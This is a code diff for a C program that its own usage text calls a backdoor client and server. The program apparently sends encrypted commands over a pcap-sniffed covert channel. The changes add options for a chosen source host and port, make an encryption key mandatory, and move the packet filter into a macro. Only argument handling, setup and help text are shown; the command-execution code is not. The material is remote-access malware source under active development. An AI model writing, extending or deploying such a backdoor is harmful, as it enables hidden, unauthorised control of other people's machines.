@@ -41,11 +41,13 @@ int main(int argc, char **argv){
     int is_server = 0;
     struct client_opt c_opt;
     c_opt.key[0] = '\0';
+    c_opt.source_host[0] = '\0';
+    c_opt.source_port = 0;
     c_opt.target_host[0] = '\0';
-    c_opt.command[0] = '\0';
     c_opt.target_port = 0;
     c_opt.device[0] = '\0';
     c_opt.protocol = 0;
+    c_opt.command[0] = '\0';
     struct server_opt s_opt;
     s_opt.key[0] = '\0';
     s_opt.device[0] = '\0';
@@ -53,7 +55,7 @@ int main(int argc, char **argv){
     s_opt.packet_delay = 200000; // Default 1/50 of a second
 
     int opt;
-    while((opt = getopt(argc, argv, "hsk:i:d:p:ut:x:")) != -1){
+    while((opt = getopt(argc, argv, "hsk:i:m:n:d:p:ut:x:")) != -1){
         switch(opt){
             case 'h':
                 usage();
@@ -68,6 +70,12 @@ int main(int argc, char **argv){
             case 'i':
                 strcpy(c_opt.device, optarg);
                 strcpy(s_opt.device, optarg);
+                break;
+            case 'm':
+                strcpy(c_opt.source_host, optarg);
+                break;
+            case 'n':
+                c_opt.source_port = atoi(optarg);
                 break;
             case 'd':
                 strcpy(c_opt.target_host, optarg);
@@ -98,7 +106,7 @@ int main(int argc, char **argv){
     /* Validation then run client or server */
 
     if(is_server){
-        if(s_opt.device[0] == '\0'){
+        if(s_opt.key[0] == '\0' || s_opt.device[0] == '\0'){
             printf("Type -h for usage help.\n");
             return 1;
         }
@@ -108,7 +116,7 @@ int main(int argc, char **argv){
         }
     }
     else{
-        if(c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0 || c_opt.device[0] == '\0'){
+        if(c_opt.key[0] == '\0' || c_opt.source_host[0] == '\0' || c_opt.source_port == 0 || c_opt.target_host[0] == '\0' || c_opt.command[0] == '\0' || c_opt.target_port == 0 || c_opt.device[0] == '\0'){
             printf("Type -h for usage help.\n");
             return 1;
         }
@@ -152,8 +160,8 @@ void client(struct client_opt c_opt){
     /* Set packet options and send packet */
 
     struct addr_info user_addr;
-    user_addr.shost = DEFAULT_SRC_IP;
-    user_addr.sport = DEFAULT_SRC_PORT;
+    user_addr.shost = c_opt.source_host;
+    user_addr.sport = c_opt.source_port;
     user_addr.dhost = c_opt.target_host;
     user_addr.dport = c_opt.target_port;
     user_addr.raw_socket = 0;
@@ -186,7 +194,7 @@ void client(struct client_opt c_opt){
     char *dev;                      /* The device to sniff on */
     char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
     struct bpf_program fp;          /* The compiled filter */
-    char filter_exp[] = "port 12345"; /* The filter expression */
+    char filter_exp[] = BD_FILTER; /* The filter expression */
     bpf_u_int32 mask;               /* Our netmask */
     bpf_u_int32 net;                /* Our IP */
 
@@ -303,7 +311,7 @@ void server(struct server_opt s_opt){
     char *dev;                      /* The device to sniff on */
     char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
     struct bpf_program fp;          /* The compiled filter */
-    char filter_exp[] = "port 12345"; /* The filter expression */
+    char filter_exp[] = BD_FILTER; /* The filter expression */
     bpf_u_int32 mask;               /* Our netmask */
     bpf_u_int32 net;                /* Our IP */
 
@@ -917,6 +925,8 @@ void usage(){
     printf("  -h                    Display this help.\n");
     printf("CLIENT (default)\n");
     printf("  -k <key>              The key to encrypt transmission with.\n");
+    printf("  -m <source_host>      The source host where the backdoor client is running.\n");
+    printf("  -n <source_port>      The source port to send from.\n");
     printf("  -d <target_host>      The target host where the backdoor server is running.\n");
     printf("  -p <target_port>      The target port to send to.\n");
     printf("  -i <interface_name>   Network interface to use.\n");
